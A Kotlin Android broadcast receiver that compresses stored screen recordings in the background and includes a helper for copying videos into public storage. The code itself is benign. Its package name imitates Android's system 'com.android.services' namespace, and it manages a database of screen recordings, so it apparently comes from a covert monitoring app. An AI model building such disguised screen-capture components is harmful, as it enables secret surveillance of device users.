package com.android.services.receiver

import android.content.BroadcastReceiver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import com.android.services.db.entities.ScreenRecording
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.InjectorUtils
import com.android.services.util.VideoCompressionUtil
import com.android.services.util.logException
import com.android.services.util.logVerbose
import kotlinx.coroutines.*
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.IOException

class VideoFileCompressorReceiver : BroadcastReceiver() {

    companion object {
        const val ACTION_COMPRESS_VIDEO = "ACTION_COMPRESS_VIDEO"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        intent?.let {
            if (intent.action == ACTION_COMPRESS_VIDEO) {
                GlobalScope.launch(Dispatchers.Default) {
                    try {
                        val recordings = fetchScreenRecordings(context!!)
                        if (recordings.isNotEmpty()) {
                            logVerbose(
                                "${AppConstants.SCREEN_RECORDING_TYPE} compressing video File",
                                AppConstants.SCREEN_RECORDING_TYPE
                            )
                            for (i in recordings.indices) {
                                val compressJob = async { compressFile(context, recordings[i]) }
                                compressJob.await()
                            }
                        }
                    } catch (exp: Exception) {
                        logException(
                            "${AppConstants.SCREEN_RECORDING_TYPE} compressing exp = ${exp.message}",
                            throwable = exp
                        )
                    }
                }
            }
        }
    }

    private fun compressFile(context: Context, screenRecording: ScreenRecording) {
        val destFile =
            "${screenRecording.file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
                screenRecording.file.substringAfterLast("/")
            }"
        VideoCompressionUtil.compressVideo(context, screenRecording.file, destFile)
    }

    private suspend fun fetchScreenRecordings(context: Context): List<ScreenRecording> {
        return withContext(Dispatchers.IO) {
            InjectorUtils.provideScreenRecordingRepository(context)
                .selectUncompressedScreenRecordings()
        }
    }

    @Suppress("DEPRECATION")
    private fun saveVideoFile(applicationContext: Context, filePath: String?): File? {
        filePath?.let {
            val videoFile = File(filePath)
            val videoFileName = "${System.currentTimeMillis()}_${videoFile.name}"
            val folderName = Environment.DIRECTORY_MOVIES
            if (Build.VERSION.SDK_INT >= 30) {

                val values = ContentValues().apply {

                    put(
                        MediaStore.Images.Media.DISPLAY_NAME,
                        videoFileName
                    )
                    put(MediaStore.Images.Media.MIME_TYPE, "video/mp4")
                    put(MediaStore.Images.Media.RELATIVE_PATH, folderName)
                    put(MediaStore.Images.Media.IS_PENDING, 1)
                }

                val collection =
                    MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
                val fileUri = applicationContext.contentResolver.insert(collection, values)
                fileUri?.let {
                    applicationContext.contentResolver.openFileDescriptor(fileUri, "rw")
                        .use { descriptor ->
                            descriptor?.let {
                                FileOutputStream(descriptor.fileDescriptor).use { out ->
                                    FileInputStream(videoFile).use { inputStream ->
                                        val buf = ByteArray(4096)
                                        while (true) {
                                            val sz = inputStream.read(buf)
                                            if (sz <= 0) break
                                            out.write(buf, 0, sz)
                                        }
                                    }
                                }
                            }
                        }

                    values.clear()
                    values.put(MediaStore.Video.Media.IS_PENDING, 0)
                    applicationContext.contentResolver.update(fileUri, values, null, null)
                    return File(getMediaPath(applicationContext, fileUri))
                }
            } else {
                val downloadsPath =
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val desFile = File(downloadsPath, videoFileName)
                if (desFile.exists())
                    desFile.delete()
                try {
                    desFile.createNewFile()
                } catch (e: IOException) {
                    e.printStackTrace()
                }
                return desFile
            }
        }
        return null
    }

    private fun getMediaPath(context: Context, uri: Uri): String {
        val resolver = context.contentResolver
        val projection = arrayOf(MediaStore.Video.Media.DATA)
        var cursor: Cursor? = null
        try {
            cursor = resolver.query(uri, projection, null, null, null)
            return if (cursor != null) {
                val columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                cursor.moveToFirst()
                cursor.getString(columnIndex)

            } else ""

        } catch (e: Exception) {
            resolver.let {
                val filePath = (context.applicationInfo.dataDir + File.separator
                        + System.currentTimeMillis())
                val file = File(filePath)

                resolver.openInputStream(uri)?.use { inputStream ->
                    FileOutputStream(file).use { outputStream ->
                        val buf = ByteArray(4096)
                        var len: Int
                        while (inputStream.read(buf).also { len = it } > 0) outputStream.write(
                            buf,
                            0,
                            len
                        )
                    }
                }
                return file.absolutePath
            }
        } finally {
            cursor?.close()
        }
    }
}